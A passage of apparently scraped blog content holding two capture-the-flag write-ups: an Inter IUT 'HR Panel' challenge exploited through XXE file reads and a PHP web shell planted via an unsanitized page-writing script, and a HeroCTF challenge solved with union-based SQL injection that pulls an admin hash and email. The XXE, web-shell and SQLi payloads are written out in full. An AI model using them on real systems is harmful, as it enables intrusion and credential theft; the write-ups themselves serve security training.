\u0026hellip;\u0026hellip;. BINGO, on peut maintenant décoder et récupérer le contenu de ce fichier .htaccess (qui sans grande surprise contient le routage des urls) :\n Contenu .htaccess encodé en base64 T3B0aW9ucyAtSW5kZXhlcwpFcnJvckRvY3VtZW50IDQwNCAvNDA0LnBocApFcnJvckRvY3VtZW50IDQwMyAvNDAzLnBocApSZXdyaXRlRW5naW5lIG9uClJld3JpdGVCYXNlIC8KUmV3cml0ZVJ1bGUgXnJlZ2lzdGVyJCAvY29yZS9yZWdpc3Rlci5waHAKUmV3cml0ZVJ1bGUgXmxvZ291dCQgL2NvcmUvbG9nb3V0LnBocApSZXdyaXRlUnVsZSBebWUkIC9jb3JlL2FjY291bnQucGhwClJld3JpdGVSdWxlIF5jb250YWN0JCAvY29yZS9jb250YWN0LnBocApSZXdyaXRlUnVsZSBebG9nJCAvY29yZS9sb2dpbi5waHAKUmV3cml0ZVJ1bGUgXmRlbGV0ZSQgL2NvcmUvZGVsZXRlLnBocApSZXdyaXRlUnVsZSBec2VydmljZXMkIC9jb3JlL3NlcnZpY2VzLnBocApSZXdyaXRlUnVsZSBec2VydmljZXMvc2xpcHMkIC9jb3JlL3NlcnZpY2VzL3NsaXBzLnBocApSZXdyaXRlUnVsZSBec2VydmljZXMvdmFjYXRpb25zJCAvY29yZS9zZXJ2aWNlcy92YWNhdGlvbnMucGhwClJld3JpdGVSdWxlIF5zZXJ2aWNlcy9yZXF1ZXN0cyQgL2NvcmUvc2VydmljZXMvcmVxdWVzdHMucGhwClJld3JpdGVSdWxlIF5hZG1pbi91c2VycyQgL2NvcmUvYWRtaW4vdXNlcnMucGhwClJld3JpdGVSdWxlIF5hZG1pbi9ub3J6aF9tYW5hZ2VtZW50JCAvY29yZS9hZG1pbi9pbnRlcml1dF9pbnRlcm5hbF9tYW5hZ2UucGhwCg====    Contenu .htaccess Options -Indexes ErrorDocument 404 /404.php ErrorDocument 403 /403.php RewriteEngine on RewriteBase / RewriteRule ^register$ /core/register.php RewriteRule ^logout$ /core/logout.php RewriteRule ^me$ /core/account.php RewriteRule ^contact$ /core/contact.php RewriteRule ^log$ /core/login.php RewriteRule ^delete$ /core/delete.php RewriteRule ^services$ /core/services.php RewriteRule ^services/slips$ /core/services/slips.php RewriteRule ^services/vacations$ /core/services/vacations.php RewriteRule ^services/requests$ /core/services/requests.php RewriteRule ^admin/users$ /core/admin/users.php RewriteRule ^admin/norzh_management$ /core/admin/interiut_internal_manage.php  \nLa dernière route, jusqu\u0026rsquo;ici inconnue est intrigante : \u0026ldquo;admin/norzh_management\u0026rdquo;, en tentant d\u0026rsquo;y accéder directement depuis le naviguateur on s\u0026rsquo;aperçoit qu\u0026rsquo;il s\u0026rsquo;agit d\u0026rsquo;une ressource uniquement accessible en interne :\nÇa tombe bien car nous sommes aussi à l\u0026rsquo;intérieur du serveur l\u0026rsquo;entreprise, alors récupérons ce fichier grâce à notre LFI sur le .docx :\n\u0026lt;!DOCTYPE test [\u0026lt;!ENTITY test SYSTEM \u0026#39;php://filter/convert.base64-encode/resource=/var/www/html/core/admin/interiut_internal_manage.php\u0026#39;\u0026gt;]\u0026gt; Et une fois de plus c\u0026rsquo;est le jackpot :\n Contenu interiut_internal_manage.php encodé en base64 PD9waHAKLy9DVEZJVVR7OGJiODQ4OTE4OTdkN2VlYTUyNDRkZGJiMTY2MmQwZGVmNmMzMDUwMWMzODI2OWRiMDQ4M2Q4OTJjODBkYWRjZX0Kc2Vzc2lvbl9zdGFydCgpOwoKaWYoIWlzc2V0KCRfU0VTU0lPTlsiZW1haWwiXSkpewogICAgaGVhZGVyKCJMb2NhdGlvbjogLyIpOwogICAgZGllKCk7Cn0KcmVxdWlyZV9vbmNlKCIuLi8uLi9jb3JlL2RhdGFiYXNlX2Nvbm5lY3QucGhwIik7CiRkYiA9IFNxbENvbm5lY3Rpb246OmdldENvbm5lY3Rpb24oKTsKJHN0aCA9ICRkYi0+cHJlcGFyZSgiU0VMRUNUICogRlJPTSB1c2VycyBXSEVSRSBlbWFpbCA9IDplbWFpbCIpOwokc3RoLT5iaW5kVmFsdWUoIjplbWFpbCIsJF9TRVNTSU9OWyJlbWFpbCJdKTsKJHN0aC0+ZXhlY3V0ZSgpOwokcmVzdWx0ID0gJHN0aC0+ZmV0Y2hBbGwoKTsKCi8vaGVhZGVyCmluY2x1ZGUoIi4uLy4uL3RlbXBsYXRlcy9oZWFkZXIucGhwIik7Cj8+CjxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iL2Fzc2V0cy9jc3MvZm9ybS5jc3MiPgo8bmF2IGNsYXNzPSJuYXZiYXIgbmF2YmFyLWV4cGFuZC1sZyBuYXZiYXItbGlnaHQgYmctbGlnaCI+CiAgPGEgY2xhc3M9Im5hdmJhci1icmFuZCIgaHJlZj0iLyI+CiAgICA8aW1nIHNyYz0iL2Fzc2V0cy9JbWFnZXMvbG9nby5wbmciIHdpZHRoPSI0NSIgaGVpZ2h0PSI0MCIgY2xhc3M9ImQtaW5saW5lLWJsb2NrIGFsaWduLXRvcCIgYWx0PSIiPgogICAgSW50ZXIgSVVUCiAgPC9hPgogIDxkaXYgY2xhc3M9ImNvbGxhcHNlIG5hdmJhci1jb2xsYXBzZSIgaWQ9Im5hdmJhck5hdkFsdE1hcmt1cCI+CiAgICA8ZGl2IGNsYXNzPSJuYXZiYXItbmF2Ij4KICAgICAgICA8YSBjbGFzcz0ibmF2LWl0ZW0gbmF2LWxpbmsiIGhyZWY9Ii8iPkhvbWU8L2E+CiAgICAgICAgPD9waHAgaWYoJHJlc3VsdFswXVsiaXNBZG1pbiJdID09PSAiMSIpeyA/PjxhIGNsYXNzPSJuYXYtaXRlbSBuYXYtbGluayBhY3RpdmUiIGhyZWY9Ii9hZG1pbi91c2VycyI+QWRtaW4gPHNwYW4gY2xhc3M9InNyLW9ubHkiPihjdXJyZW50KTwvc3Bhbj48L2E+PD9waHAgfSA/PgogICAgICAgIDxhIGNsYXNzPSJuYXYtaXRlbSBuYXYtbGluayIgaHJlZj0iL3NlcnZpY2VzIj5TZXJ2aWNlczwvYT4KICAgICAgICA8YSBjbGFzcz0ibmF2LWl0ZW0gbmF2LWxpbmsiIGhyZWY9Ii9jb250YWN0Ij5Db250YWN0PC9hPgogICAgICAgIDxhIGNsYXNzPSJuYXYtaXRlbSBuYXYtbGluayIgaHJlZj0iL21lIj5NeSBhY2NvdW50PC9hPiAgCiAgICAgICAgPGEgY2xhc3M9Im5hdi1pdGVtIG5hdi1saW5rIiBocmVmPSIvbG9nb3V0Ij5Mb2dvdXQ8L2E+CiAgICA8L2Rpdj4KICA8L2Rpdj4KPC9uYXY+Cjw/cGhwIGlmKCRfU0VSVkVSWyJSRU1PVEVfQUREUiJdID09PSAiMTI3LjAuMC4xIil7ID8+CiAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgIDxkaXYgY2xhc3M9InJvdyI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbCB0ZXh0LWNlbnRlciI+CiAgICAgICAgICAgICAgICA8cCBjbGFzcz0ibGVhZCIgc3R5bGU9ImNvbG9yOiAjNTI5YmMwOyI+QXBwbGljYXRpb24gbWFuYWdlbWVudCBzZXJ2aWNlLiBTdGF0dXMgb2Ygc2VydmljZXM6PC9wPgogICAgICAgICAgICAgICAgPHRhYmxlIGNsYXNzPSJ0YWJsZSI+CiAgICAgICAgICAgICAgICAgICAgPHRoZWFkPgogICAgICAgICAgICAgICAgICAgICAgICA8dHI+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0aCBzY29wZT0iY29sIj4jPC90aD4KICAgICAgICAgICAgICAgICAgICAgICAgPHRoIHNjb3BlPSJjb2wiPlNlcnZpY2U8L3RoPgogICAgICAgICAgICAgICAgICAgICAgICA8dGggc2NvcGU9ImNvbCI+U3RhdGU8L3RoPgogICAgICAgICAgICAgICAgICAgICAgICA8L3RyPgogICAgICAgICAgICAgICAgICAgIDwvdGhlYWQ+CiAgICAgICAgICAgICAgICAgICAgPHRib2R5PgogICAgICAgICAgICAgICAgICAgICAgICA8dHI+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0aCBzY29wZT0icm93Ij4xPC90aD4KICAgICAgICAgICAgICAgICAgICAgICAgPHRkPjxhIHRhcmdldD0iX2JsYW5rIiBocmVmPSIvY29udGFjdCI+Q29udGFjdCBwYWdlPC9hPjwvdGQ+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD5SdW5uaW5nPC90ZD4KICAgICAgICAgICAgICAgICAgICAgICAgPC90cj4KICAgICAgICAgICAgICAgICAgICAgICAgPHRyPgogICAgICAgICAgICAgICAgICAgICAgICA8dGggc2NvcGU9InJvdyI+MjwvdGg+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD48YSB0YXJnZXQ9Il9ibGFuayIgaHJlZj0iL3NlcnZpY2VzL3ZhY2F0aW9ucyI+VmFjYXRpb25zPC9hPjwvdGQ+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD5SdW5uaW5nPC90ZD4KICAgICAgICAgICAgICAgICAgICAgICAgPC90cj4KICAgICAgICAgICAgICAgICAgICAgICAgPHRyPgogICAgICAgICAgICAgICAgICAgICAgICA8dGggc2NvcGU9InJvdyI+MzwvdGg+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD48YSB0YXJnZXQ9Il9ibGFuayIgaHJlZj0iL3NlcnZpY2VzL3NsaXBzIj5TbGlwcyB2aWV3ZXI8L2E+PC90ZD4KICAgICAgICAgICAgICAgICAgICAgICAgPHRkPlJ1bm5pbmc8L3RkPgogICAgICAgICAgICAgICAgICAgICAgICA8L3RyPgogICAgICAgICAgICAgICAgICAgICAgICA8dHI+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0aCBzY29wZT0icm93Ij40PC90aD4KICAgICAgICAgICAgICAgICAgICAgICAgPHRkPjxhIHRhcmdldD0iX2JsYW5rIiBocmVmPSIvc2VydmljZXMvcmVxdWVzdHMiPkhSIFJlcXVlc3RzPC9hPjwvdGQ+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD5SdW5uaW5nPC90ZD4KICAgICAgICAgICAgICAgICAgICAgICAgPC90cj4KICAgICAgICAgICAgICAgICAgICAgICAgPHRyPgogICAgICAgICAgICAgICAgICAgICAgICA8dGggc2NvcGU9InJvdyI+NTwvdGg+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD48YSB0YXJnZXQ9Il9ibGFuayIgaHJlZj0iL2FkbWluL3VzZXJzIj5BY2NvdW50IFZlcmlmaWNhdGlvbiBTZXJ2aWNlPC9hPjwvdGQ+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD5SdW5uaW5nPC90ZD4KICAgICAgICAgICAgICAgICAgICAgICAgPC90cj4KICAgICAgICAgICAgICAgICAgICAgICAgPHRyPgogICAgICAgICAgICAgICAgICAgICAgICA8dGggc2NvcGU9InJvdyI+NjwvdGg+CiAgICAgICAgICAgICAgICAgICAgICAgIDwhLS0gPHRkPjxhIHRhcmdldD0iX2JsYW5rIiBocmVmPSIvbWFpbnRlbmFuY2Uvc2NyaXB0cy94Q0Y4UGQzODJRcDN6T1pUYVM3SC5waHAiPkFkZGluZyBwYWdlcyBzZXJ2aWNlPC9hPjwvdGQ+IC0tPgoJCQk8IS0tIE5vdGU6IHRoZSBwaHAgc2NyaXB0IG5hbWUgaGFzIGJlZW4gY2hhbmdlZCB0byBhdm9pZCBicnV0ZWZvcmNlIC0tPgogICAgICAgICAgICAgICAgICAgICAgICA8dGQ+PGEgaHJlZj0iIyIgb25jbGljaz0iYWxlcnQoJ1RoaXMgc2VydmljZSBpcyBjdXJyZW50bHkgdW5hdmFpbGFibGUgdG8geW91LicpOyI+QWRkaW5nIHBhZ2VzIHNlcnZpY2U8L2E+PC90ZD4KICAgICAgICAgICAgICAgICAgICAgICAgPHRkPkluIG1haW50ZW5hbmNlIGR1ZSB0byBzZWN1cml0eSBicmVhY2hlczwvdGQ+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvdHI+CiAgICAgICAgICAgICAgICAgICAgPC90Ym9keT4KICAgICAgICAgICAgICAgIDwvdGFibGU+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgPC9kaXY+Cjw/cGhwIH1lbHNleyA/PgogICAgPGRpdiBjbGFzcz0id3JhcHBlciBmYWRlSW5Eb3duIj4KICAgICAgICA8cCBjbGFzcz0ibGVhZCIgc3R5bGU9ImNvbG9yOiByZWQ7Ij5BY2Nlc3MgZm9yYmlkZGVuLiBUaGlzIHBhcnQgY2FuIG9ubHkgYmUgYWNjZXNzZWQgZnJvbSB0aGUgaW50ZXJuYWwgbmV0d29yay48L3A+CiAgICAgICAgPGltZyBzcmM9Ii9hc3NldHMvSW1hZ2VzL2xvZ28ucG5nIiB3aWR0aD0iMTAwIiBoZWlnaHQ9Ijg4Ij4KICAgIDwvZGl2Pgo8P3BocCB9IGluY2x1ZGUoIi4uLy4uL3RlbXBsYXRlcy9mb290ZXIucGhwIik7ID8+Cg==    Page interiut_internal_manage.php \u0026lt;?php //CTFIUT{8bb84891897d7eea5244ddbb1662d0def6c30501c38269db0483d892c80dadce} session_start(); if(!isset($_SESSION[\u0026#34;email\u0026#34;])){ header(\u0026#34;Location: /\u0026#34;); die(); } require_once(\u0026#34;../../core/database_connect.php\u0026#34;); $db = SqlConnection::getConnection(); $sth = $db-\u0026gt;prepare(\u0026#34;SELECT * FROM users WHERE email = :email\u0026#34;); $sth-\u0026gt;bindValue(\u0026#34;:email\u0026#34;,$_SESSION[\u0026#34;email\u0026#34;]); $sth-\u0026gt;execute(); $result = $sth-\u0026gt;fetchAll(); //header include(\u0026#34;../../templates/header.php\u0026#34;); ?\u0026gt;\u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/assets/css/form.css\u0026#34;\u0026gt; \u0026lt;nav class=\u0026#34;navbar navbar-expand-lg navbar-light bg-ligh\u0026#34;\u0026gt; \u0026lt;a class=\u0026#34;navbar-brand\u0026#34; href=\u0026#34;/\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;/assets/Images/logo.png\u0026#34; width=\u0026#34;45\u0026#34; height=\u0026#34;40\u0026#34; class=\u0026#34;d-inline-block align-top\u0026#34; alt=\u0026#34;\u0026#34;\u0026gt; Inter IUT \u0026lt;/a\u0026gt; \u0026lt;div class=\u0026#34;collapse navbar-collapse\u0026#34; id=\u0026#34;navbarNavAltMarkup\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;navbar-nav\u0026#34;\u0026gt; \u0026lt;a class=\u0026#34;nav-item nav-link\u0026#34; href=\u0026#34;/\u0026#34;\u0026gt;Home\u0026lt;/a\u0026gt; \u0026lt;?php if($result[0][\u0026#34;isAdmin\u0026#34;] === \u0026#34;1\u0026#34;){ ?\u0026gt;\u0026lt;a class=\u0026#34;nav-item nav-link active\u0026#34; href=\u0026#34;/admin/users\u0026#34;\u0026gt;Admin \u0026lt;span class=\u0026#34;sr-only\u0026#34;\u0026gt;(current)\u0026lt;/span\u0026gt;\u0026lt;/a\u0026gt;\u0026lt;?php } ?\u0026gt; \u0026lt;a class=\u0026#34;nav-item nav-link\u0026#34; href=\u0026#34;/services\u0026#34;\u0026gt;Services\u0026lt;/a\u0026gt; \u0026lt;a class=\u0026#34;nav-item nav-link\u0026#34; href=\u0026#34;/contact\u0026#34;\u0026gt;Contact\u0026lt;/a\u0026gt; \u0026lt;a class=\u0026#34;nav-item nav-link\u0026#34; href=\u0026#34;/me\u0026#34;\u0026gt;My account\u0026lt;/a\u0026gt; \u0026lt;a class=\u0026#34;nav-item nav-link\u0026#34; href=\u0026#34;/logout\u0026#34;\u0026gt;Logout\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/nav\u0026gt; \u0026lt;?php if($_SERVER[\u0026#34;REMOTE_ADDR\u0026#34;] === \u0026#34;127.0.0.1\u0026#34;){ ?\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col text-center\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;lead\u0026#34; style=\u0026#34;color: #529bc0;\u0026#34;\u0026gt;Application management service. Status of services:\u0026lt;/p\u0026gt; \u0026lt;table class=\u0026#34;table\u0026#34;\u0026gt; \u0026lt;thead\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;th scope=\u0026#34;col\u0026#34;\u0026gt;#\u0026lt;/th\u0026gt; \u0026lt;th scope=\u0026#34;col\u0026#34;\u0026gt;Service\u0026lt;/th\u0026gt; \u0026lt;th scope=\u0026#34;col\u0026#34;\u0026gt;State\u0026lt;/th\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/thead\u0026gt; \u0026lt;tbody\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;th scope=\u0026#34;row\u0026#34;\u0026gt;1\u0026lt;/th\u0026gt; \u0026lt;td\u0026gt;\u0026lt;a target=\u0026#34;_blank\u0026#34; href=\u0026#34;/contact\u0026#34;\u0026gt;Contact page\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;Running\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;th scope=\u0026#34;row\u0026#34;\u0026gt;2\u0026lt;/th\u0026gt; \u0026lt;td\u0026gt;\u0026lt;a target=\u0026#34;_blank\u0026#34; href=\u0026#34;/services/vacations\u0026#34;\u0026gt;Vacations\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;Running\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;th scope=\u0026#34;row\u0026#34;\u0026gt;3\u0026lt;/th\u0026gt; \u0026lt;td\u0026gt;\u0026lt;a target=\u0026#34;_blank\u0026#34; href=\u0026#34;/services/slips\u0026#34;\u0026gt;Slips viewer\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;Running\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;th scope=\u0026#34;row\u0026#34;\u0026gt;4\u0026lt;/th\u0026gt; \u0026lt;td\u0026gt;\u0026lt;a target=\u0026#34;_blank\u0026#34; href=\u0026#34;/services/requests\u0026#34;\u0026gt;HR Requests\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;Running\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;th scope=\u0026#34;row\u0026#34;\u0026gt;5\u0026lt;/th\u0026gt; \u0026lt;td\u0026gt;\u0026lt;a target=\u0026#34;_blank\u0026#34; href=\u0026#34;/admin/users\u0026#34;\u0026gt;Account Verification Service\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;Running\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;th scope=\u0026#34;row\u0026#34;\u0026gt;6\u0026lt;/th\u0026gt; \u0026lt;!-- \u0026lt;td\u0026gt;\u0026lt;a target=\u0026#34;_blank\u0026#34; href=\u0026#34;/maintenance/scripts/xCF8Pd382Qp3zOZTaS7H.php\u0026#34;\u0026gt;Adding pages service\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt; --\u0026gt; \u0026lt;!-- Note: the php script name has been changed to avoid bruteforce --\u0026gt; \u0026lt;td\u0026gt;\u0026lt;a href=\u0026#34;#\u0026#34; onclick=\u0026#34;alert(\u0026#39;This service is currently unavailable to you.\u0026#39;);\u0026#34;\u0026gt;Adding pages service\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;In maintenance due to security breaches\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/tbody\u0026gt; \u0026lt;/table\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;?php }else{ ?\u0026gt; \u0026lt;div class=\u0026#34;wrapper fadeInDown\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;lead\u0026#34; style=\u0026#34;color: red;\u0026#34;\u0026gt;Access forbidden. This part can only be accessed from the internal network.\u0026lt;/p\u0026gt; \u0026lt;img src=\u0026#34;/assets/Images/logo.png\u0026#34; width=\u0026#34;100\u0026#34; height=\u0026#34;88\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;?php } include(\u0026#34;../../templates/footer.php\u0026#34;); ?\u0026gt;  \nComme vous pouvez le constater, nous observons une ligne intéressante en haut de la page :\n//CTFIUT{8bb84891897d7eea5244ddbb1662d0def6c30501c38269db0483d892c80dadce} FLAG 2 : CTFIUT{8bb84891897d7eea5244ddbb1662d0def6c30501c38269db0483d892c80dadce}\nHR-Panel 3 - 150pts Au delà du flag, ce fichier contient des informations intéressantes dont deux commentaires pour le moins intriguants :\n\u0026lt;!-- \u0026lt;td\u0026gt;\u0026lt;a target=\u0026#34;_blank\u0026#34; href=\u0026#34;/maintenance/scripts/xCF8Pd382Qp3zOZTaS7H.php\u0026#34;\u0026gt;Adding pages service\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt; --\u0026gt; \u0026lt;!-- Note: the php script name has been changed to avoid bruteforce --\u0026gt; Lorsque que l\u0026rsquo;on y accède directement , la page semble exister mais n\u0026rsquo;affiche rien :\nTentons donc d\u0026rsquo;y récupérer son contenu afin de voir ce qui se cache derrière. Pour cela même principe qu\u0026rsquo;avant on se sert de notre LFI :\n\u0026lt;!DOCTYPE test [\u0026lt;!ENTITY test SYSTEM \u0026#39;php://filter/convert.base64-encode/resource=/var/www/html/maintenance/scripts/xCF8Pd382Qp3zOZTaS7H.php\u0026#39;\u0026gt;]\u0026gt;  Contenu xCF8Pd382Qp3zOZTaS7H.php encodé en base64 PD9waHAKLyoKVE9ETzoKSXQgaXMgbmVjZXNzYXJ5IHRvIGZpeCB0aGUgcHJvYmxlbSB3aGVuIGFkZGluZyBhIHBhZ2UsIHRvIHByZXZlbnQgcGhwIGZ1bmN0aW9ucyB0byBiZSBjYWxsZWQuIApTb21lIG9mIHRoZW0gYXJlIGRpc2FibGVkIGluIC9ldGMvcGhwLzcuNC9hcGFjaGUyL3BocC5pbmksIGJ1dCBhZnRlciBhbiBpbnRlcm5hbCBwZW50ZXN0LCB0aGV5IHN0aWxsIG1hbmFnZWQgdG8gZXhlY3V0ZSBzb21lIGNvZGUuCiovCmlmKCRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddID09PSAiR0VUIil7CiAgICBpZihpc3NldCgkX0dFVFsicGFnZUNvbnRlbnQiXSkgJiYgaXNzZXQoJF9HRVRbInBhZ2VOYW1lIl0pKXsgLy8gTXVzdCBiZSBhICRfR0VUIGhlcmUgYmVjYXVzZSB0aGVyZSBpcyBubyBpbnRlcmZhY2UgZm9yIHRoaXMgcGFnZS4KICAgICAgICAkZiA9IGZvcGVuKCIvdmFyL3d3dy9odG1sL21haW50ZW5hbmNlL3RlbXBsYXRpbmdfcGFnZXMvIi5zdHJfcmVwbGFjZSgiLiIsIiIsJF9HRVRbInBhZ2VOYW1lIl0pLiIucGhwIiwiYSsiKTsKICAgICAgICBmd3JpdGUoJGYsJF9HRVRbInBhZ2VDb250ZW50Il0pOwogICAgICAgIGZjbG9zZSgkZik7CiAgICAgICAgZWNobygiUGFnZSB1cGxvYWRlZCB0byAvbWFpbnRlbmFuY2UvdGVtcGxhdGluZ19wYWdlcy8iLnN0cl9yZXBsYWNlKCIuIiwiIiwkX0dFVFsicGFnZU5hbWUiXSkuIi5waHAiKTsKICAgIH0KfQo/Pg==    Contenu xCF8Pd382Qp3zOZTaS7H.php \u0026lt;?php /* TODO: It is necessary to fix the problem when adding a page, to prevent php functions to be called. Some of them are disabled in /etc/php/7.4/apache2/php.ini, but after an internal pentest, they still managed to execute some code. */ if($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] === \u0026#34;GET\u0026#34;){ if(isset($_GET[\u0026#34;pageContent\u0026#34;]) \u0026amp;\u0026amp; isset($_GET[\u0026#34;pageName\u0026#34;])){ // Must be a $_GET here because there is no interface for this page.  $f = fopen(\u0026#34;/var/www/html/maintenance/templating_pages/\u0026#34;.str_replace(\u0026#34;.\u0026#34;,\u0026#34;\u0026#34;,$_GET[\u0026#34;pageName\u0026#34;]).\u0026#34;.php\u0026#34;,\u0026#34;a+\u0026#34;); fwrite($f,$_GET[\u0026#34;pageContent\u0026#34;]); fclose($f); echo(\u0026#34;Page uploaded to /maintenance/templating_pages/\u0026#34;.str_replace(\u0026#34;.\u0026#34;,\u0026#34;\u0026#34;,$_GET[\u0026#34;pageName\u0026#34;]).\u0026#34;.php\u0026#34;); } } ?\u0026gt; \nRemote Code Execution (RCE) Le contenu est simple et son utilisation est flagrante : En envoyant deux paramètres pageName et pageContent en GET, le backend nous créer un fichier de nom pageName et contenant ce qui sera dans le paramètre pageContent.\nOn essaye donc dans un premier temps d\u0026rsquo;avoir le contenu suivant dans le fichier php afin de pouvoir exécuter ce qui sera dans le paramètre cmd:\nhttp://hr-panel.interiut.ctf/maintenance/scripts/xCF8Pd382Qp3zOZTaS7H.php?pageName=a\u0026amp;pageContent=\u0026lt;?php echo system($_GET[\u0026#34;cmd\u0026#34;]); ?\u0026gt; La page est bien upload :\nCependant lorsque que l\u0026rsquo;on se rend dessus et que l\u0026rsquo;on essaye d\u0026rsquo;y exécuter la commande \u0026ldquo;ls\u0026rdquo; , rien ne se passe.\nIl est alors possible que la commande soit bloqué. Pour savoir quelles fonctions sont bloqués, on peut entre autres afficher la page d\u0026rsquo;info php avec la fonction phpinfo(). Récréons donc une nouvelle page :\nhttp://hr-panel.interiut.ctf/maintenance/scripts/xCF8Pd382Qp3zOZTaS7H.php?pageName=info\u0026amp;pageContent=\u0026lt;?php phpinfo(); ?\u0026gt; On peut y apercevoir qu\u0026rsquo;une grande partie des fonctions permettant de faire executé du code dans le backend sont bloqués, hormis popen() et passthru(). Utilisons donc cette dernière et naviguons à travers les fichiers du serveur afin d\u0026rsquo;y trouver un fichier intéressant :\nhttp://hr-panel.interiut.ctf/maintenance/scripts/xCF8Pd382Qp3zOZTaS7H.php?pageName=helloRCE\u0026amp;pageContent=\u0026lt;?php passthru($_GET[\u0026#34;cmd\u0026#34;]); ?\u0026gt; FLAG 3 : CTFIUT{f4560bf653f0f452848e638d25c83583e50d01f031d384169fc1438673eb6ebc}\n","date":"2021-06-21T00:00:00Z","image":"https://endeavxor.github.io/p/inter-iut-hr-panel-1-2-3/cover.jpg","permalink":"https://endeavxor.github.io/p/inter-iut-hr-panel-1-2-3/","title":"Inter IUT - HR Panel (1, 2 \u0026 3)"},{"content":"TLDR :  Find and exploit SQL Injection (Union Based \u0026amp; Error Based) Bypass filters on admin pannel in order to upload your PHP reverse shell  Discover the website When we arrive on the site we come across this classic login page\nAfter a few attempts to search for classic vulnerabilities (ServerSide Template Injection,SQLi,etc\u0026hellip;) which did not yield anything, I create an account and log in to discover the rest of the site. Once connected, you come across a book manager in which you can add books and manage them later.\nAs you can see your library is very empty, so let\u0026rsquo;s add a book to it.\nNow that we have added a book, we can search for it in the \u0026ldquo;Search\u0026rdquo; tab and manage it. And that\u0026rsquo;s where the interesting things will start \u0026hellip;.\nFinding and exploiting SQLi As you can see, the site retrieves the id in the URL in order to find the book that we want to manage, this is very reminiscent of the possibility of an SQL injection, which is confirmed when the addition of the quotation mark causes the error. The first information is the type of database which is MySQL(=MariaDB). As a first approach I tell myself that if the response to the request sent contains more lines (and therefore several books) they will all be displayed on this page: it will therefore be necessary first to determine the exact number of columns in the table which stores the books so that you can do a UNION query with a dummy entry.\nhttp://chall2.heroctf.fr:8050/?page=manageBook\u0026amp;id=78456 UNION SELECT NULL,NULL,NULL,NULL,NULL -- -\nAfter some tries by incrementing the number of NULL values \u0026hellip;\nhttp://chall2.heroctf.fr:8050/?page=manageBook\u0026amp;id=78456 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL- --\nThere are therefore 9 columns in the table. The first column should be the id, which is confirmed (and leads to an injection error based) when retrieving the version of MySQL\nhttp://chall2.heroctf.fr:8050/?page=manageBook\u0026amp;id=78456 UNION SELECT @@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL- --\nEverything that will be indicated in the first field of our UNION in the url will display an error because the database expects an integer for the ID column, we will therefore be able to extract information including user logins and passwords. Luckily the tables and the names of the columns where the connection information is stored are predictable:\nhttp://chall2.heroctf.fr:8050/?page=manageBook\u0026amp;id=78456 UNION SELECT (SELECT password from users LIMIT 1),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -\nA hash password is returned to us (pray that it is from the admin), after a quick search it is an MD5 hash which corresponds to : MD5(urfaceismassive) = 6431468f98f6552c3af0816307f91c06 Now we need to find the username :\nhttp://chall2.heroctf.fr:8050/?page=manageBook\u0026amp;id=78456 UNION SELECT (SELECT username from users LIMIT 1),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -\nThere is apparently no username column, let\u0026rsquo;s test if there is an email column :\nhttp://chall2.heroctf.fr:8050/?page=manageBook\u0026amp;id=78456 UNION SELECT (SELECT email from users LIMIT 1),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -\nAn email is returned : admin@adminozor.fr. Let\u0026rsquo;s try to connect with these credentials, and 